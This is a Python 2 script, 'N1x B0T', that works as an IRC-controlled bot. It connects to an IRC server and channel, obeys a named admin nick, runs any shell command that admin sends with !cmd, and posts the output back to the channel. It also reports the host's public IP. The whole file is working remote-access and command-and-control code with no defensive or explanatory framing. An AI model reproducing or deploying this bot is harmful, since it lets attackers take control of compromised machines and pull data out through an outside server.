#!/usr/bin/env python
import sys, socket, urllib2, random, subprocess,time
"""
:) N1x B0T V1.0
"""




nick = "nix"+str(random.randint(1,100000))
server = 'irc.freenode.net'
port = 6667
channel = "#testnix"
#timeout = 30
#socket.setdefaulttimeout(timeout)
admin = 'unixawy'


def connect():
	global s
	try:
		s = socket.socket()
		s.connect((server, port))
		s.send("NICK %s\r\n" % nick)
		s.send("USER %s %s nix :%s\r\n" % (nick,nick,nick))
		s.send("JOIN :%s\r\n" % channel)
	except socket.error as socketerror:
		print("Error: ", socketerror)
		# connect()
			

def manual():
	s.send("PRIVMSG %s :%s\r\n" % (channel, "[!]        : Manual"))
	s.send("PRIVMSG %s :%s\r\n" % (channel, "!help      : List Bot Commands"))
	s.send("PRIVMSG %s :%s\r\n" % (channel, "!cmd       : Run Linux command"))
	s.send("PRIVMSG %s :%s\r\n" % (channel, "!getip     : Get Box IP"))
	s.send("PRIVMSG %s :%s\r\n" % (channel, "!kill      : Kill the Bot"))
	return None

def cmd(command):
	print "Running CMD"
	print command
	execute = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	output = execute.stdout.read()
	s.send("PRIVMSG %s :%s%s\r\n" % (channel, "[!]Running: ", command))
	out_lines = output.split("\n")
	if len(out_lines) >= 3:
		s.send("PRIVMSG %s :%s\r\n" % (channel , "[-]Slow Buffer"))
		time.sleep(2)
		i = 0
		for line in out_lines:
			i += 1
			if i == 5:
				time.sleep(6)
				i = 0
			s.send("PRIVMSG %s :%s%s\r\n" % (channel, "[+]Output: ", line))
			time.sleep(1.9)
	else:
		s.send("PRIVMSG %s :%s%s\r\n" % (channel, "[+]Output: ", output))
	return None

def getip():
	ip = urllib2.urlopen('http://ifconfig.me/ip')
	server = ip.read()
	server_ip = server.split("\n")[0]
	s.send("PRIVMSG %s :%s%s\r\n" %(channel,"[+]IP:",server_ip))
	
connect()
lines = ""
while True:

	try:
		msgs = s.recv(2048)
	except:
		print "Reconnecting..."
		connect()

	try:
		row = msgs.strip().split(" ")
		print row
	except:
		print "unable to connect error 0x1"

	 
	print msgs

	if row[0] == 'PING':
		print "PONG !" + row[1].split(":")[1]
		s.send("PONG %s \r\n" %row[1].split(":")[1])

	current_user = msgs.strip().split(":")[1].split("!")[0]
	print current_user
	if current_user != admin:
		continue
	try:

		if row[3] == ":!help":
			manual()

		if row[3] == ":!cmd":
			command = msgs.split(":!cmd")[1].strip()
			print "Sending to cmd() %s %s" %(command ,"$!")
			cmd(command)

		if row[3] == ":!getip":
			getip()

		if row[3] == ":!kill":
			break
			sys.exit()
						
	except:
		pass
